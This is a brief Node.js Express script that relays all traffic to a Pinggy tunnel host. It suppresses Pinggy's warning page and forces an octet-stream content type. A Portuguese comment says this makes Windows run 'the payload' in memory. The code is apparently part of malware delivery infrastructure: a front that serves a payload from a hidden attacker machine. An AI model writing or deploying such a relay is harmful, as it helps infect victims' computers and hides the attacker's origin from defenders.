const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();

const DESTINO = 'http://wofka-164-163-214-220.a.free.pinggy.link'; 

app.use('/', createProxyMiddleware({ 
    target: DESTINO, 
    changeOrigin: true,
    onProxyReq: (proxyReq) => {
        proxyReq.setHeader('x-pinggy-no-screen', 'true');
    },
    onProxyRes: (proxyRes) => {
        // Isso força o Windows a executar o payload na memória
        proxyRes.headers['content-type'] = 'application/octet-stream'; 
    }
}));

app.listen(process.env.PORT || 3000);
